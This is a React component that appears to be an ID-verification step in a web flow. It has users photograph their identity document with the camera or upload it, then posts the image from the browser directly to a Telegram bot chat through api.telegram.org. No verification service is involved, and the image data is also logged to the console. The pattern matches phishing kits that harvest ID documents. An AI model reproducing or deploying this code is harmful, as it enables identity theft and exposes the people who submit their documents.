import React, { useRef, useContext, useState } from 'react';
import Grid from '@mui/material/Grid';
import Box from '@mui/material/Box';
import IconButton from '@mui/material/IconButton';
import PhotoCameraRoundedIcon from '@mui/icons-material/PhotoCameraRounded';
import Button from '@mui/material/Button';
import { styled } from '@mui/material/styles';
import { AuthContext } from '../context/AuthContext';
import CircularProgress from '@mui/material/CircularProgress';

const Input = styled('input')({
  display: 'none',
});

const ImgBox = styled(Box)({
  maxWidth: "80%",
  maxHeight: "80%",
  margin: "10px",
  display: 'flex',
  justifyContent: 'center',
  border: '1px solid black',
});

const Img = styled('img')({
  height: 'inherit',
  maxWidth: 'inherit',
});

function IdVerification({ onNext }) {
  const [idSource, setIdSource] = useState("");
  const { setPhotoId } = useContext(AuthContext);
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [isCameraActive, setIsCameraActive] = useState(false);
  const [isLoading, setIsLoading] = useState(false); // Loading state

  const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN; // Ensure this is in your .env file
  const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID; // Also in your .env file

  const startCamera = () => {
    setIsCameraActive(true);
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
      .then(stream => {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
      })
      .catch(err => {
        console.error('Error accessing camera: ', err);
      });
  };

  const capturePhoto = () => {
    const context = canvasRef.current.getContext('2d');
    context.drawImage(videoRef.current, 0, 0, canvasRef.current.width, canvasRef.current.height);
    const dataUrl = canvasRef.current.toDataURL('image/png');
    
    console.log('Captured Data URL:', dataUrl);
    
    setIdSource(dataUrl);
    setPhotoId(dataUrl);
    stopCamera();
  };

  const stopCamera = () => {
    if (videoRef.current && videoRef.current.srcObject) {
      const tracks = videoRef.current.srcObject.getTracks();
      tracks.forEach(track => track.stop());
      setIsCameraActive(false);
    }
  };

  const handleCapture = (target) => {
    if (target.files && target.files.length !== 0) {
      const file = target.files[0];
      const newUrl = URL.createObjectURL(file);
      setIdSource(newUrl);
      setPhotoId(newUrl);
    }
  };

  const dataURLtoBlob = (dataURL) => {
    const [header, data] = dataURL.split(',');
    const mime = header.match(/:(.*?);/)[1];
    const binary = atob(data);
    const array = [];

    for (let i = 0; i < binary.length; i++) {
      array.push(binary.charCodeAt(i));
    }

    return new Blob([new Uint8Array(array)], { type: mime });
  };

  const handleSubmit = async () => {
    setIsLoading(true); // Start loading
    try {
      let blob;
      if (idSource.startsWith('data:')) {
        blob = dataURLtoBlob(idSource);
      } else if (idSource.startsWith('blob:')) {
        const response = await fetch(idSource);
        blob = await response.blob();
      } else {
        throw new Error('Unsupported ID Source format');
      }
  
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, 'id_image.png');
      formData.append('caption', 'ID Verification Photo');
  
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData,
      });
  
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
  
      const result = await response.json();
      console.log('Photo sent to Telegram successfully:', result);
      onNext(); // Proceed to the next step
    } catch (error) {
      console.error('Sending to Telegram failed:', error);
    } finally {
      setIsLoading(false); // Stop loading
    }
  };

  return (
    <div>
      <div className="hidden xl:block">
        <Grid container>
          <Grid item xs={12} className='grid'>
            <h5 className='mb-4 text-center'>Verify your ID</h5>
            {isCameraActive ? (
              <>
                <div className="relative mb-4 place-self-center">
                  <video ref={videoRef} className="w-full max-w-md" />
                  <canvas ref={canvasRef} className="hidden" width="400" height="300"></canvas>
                </div>
                <div className="flex justify-center mb-4">
                  <Button onClick={capturePhoto} variant="contained" color="primary">Capture ID</Button>
                </div>
              </>
            ) : (
              <Button onClick={startCamera} variant="contained" color="primary" className="place-self-center">
                Start Camera</Button>
            )}
            {idSource && (
              <div className="mt-4 place-self-center">
                <ImgBox>
                  <Img src={idSource} alt="Captured" />
                </ImgBox>
                <Button 
                  onClick={handleSubmit} 
                  variant="contained" 
                  color="primary"
                  disabled={isLoading} // Disable the button while loading
                >
                  {isLoading ? <CircularProgress size={24} /> : 'Submit'} {/* Show loading spinner or text */}
                </Button>
              </div>
            )}
          </Grid>
        </Grid>
      </div>

      {/* Mobile Version */}
      <div className="xl:hidden" style={{ height: '100%', textAlign: 'center' }}>
        <Grid container>
          <Grid item xs={12}>
            <h3 className="mb-4 font-semibold">ID Verification</h3>
            <h5 className="mb-4 " >Verify your ID</h5>
            {idSource && (
              <ImgBox>
                <Img src={idSource} alt="snap" />
              </ImgBox>
            )}
            <Input
              accept="image/*"
              id="icon-button-file"
              type="file"
              capture="environment"
              onChange={(e) => handleCapture(e.target)}
            />
            <label htmlFor="icon-button-file">
              <IconButton
                color="primary"
                aria-label="upload picture"
                component="span"
              >
                <PhotoCameraRoundedIcon fontSize="large" />
              </IconButton>
            </label>
            {idSource && (
              <Button 
                onClick={handleSubmit} 
                variant="contained" 
                color="primary"
                style={{ marginTop: '10px' }}
                disabled={isLoading} // Disable the button while loading
              >
                {isLoading ? <CircularProgress size={24} /> : 'Submit'} {/* Show loading spinner or text */}
              </Button>
            )}
          </Grid>
        </Grid>
      </div>
    </div>
  );
}

export default IdVerification;
